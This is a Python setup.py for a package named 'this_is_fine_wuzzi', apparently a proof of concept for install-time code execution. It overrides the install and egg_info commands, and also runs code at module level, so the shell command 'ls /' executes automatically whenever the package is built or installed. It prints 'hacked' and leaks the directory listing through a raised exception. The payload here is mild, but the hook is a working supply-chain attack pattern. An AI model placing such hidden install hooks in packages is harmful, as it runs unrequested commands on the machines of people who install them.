from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info


def RunCommand():
    print('hacked')
    from subprocess import Popen, PIPE
    pro = Popen('ls /', shell=True, stdout=PIPE, stderr=PIPE)
    x,_ = pro.communicate()
    x = x.decode()
    raise Exception(x)
    
class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

from subprocess import Popen, PIPE
pro = Popen('ls /', shell=True, stdout=PIPE, stderr=PIPE)
x,_ = pro.communicate()
x = x.decode()
raise Exception(x)
        
setup(
    name = "this_is_fine_wuzzi",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)
